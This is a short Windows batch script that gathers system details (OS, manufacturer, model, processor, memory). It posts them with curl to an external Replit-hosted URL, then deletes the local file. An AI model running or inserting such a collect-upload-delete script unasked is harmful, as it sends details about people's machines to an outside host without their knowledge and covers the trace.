@echo off
:: Collect important system information
systeminfo | findstr /C:"OS Name" /C:"OS Version" /C:"System Manufacturer" /C:"System Model" /C:"Processor(s)" /C:"Total Physical Memory" /C:"Available Physical Memory" > important_sysinfo.txt

:: Send the data to the Replit server
curl -X POST -H "Content-Type: text/plain" --data-binary "@important_sysinfo.txt" https://cfb53da8-4871-4cd0-af96-095c708ad0f5-00-1129qpina38jq.picard.replit.dev/

:: Clean up
del important_sysinfo.txt
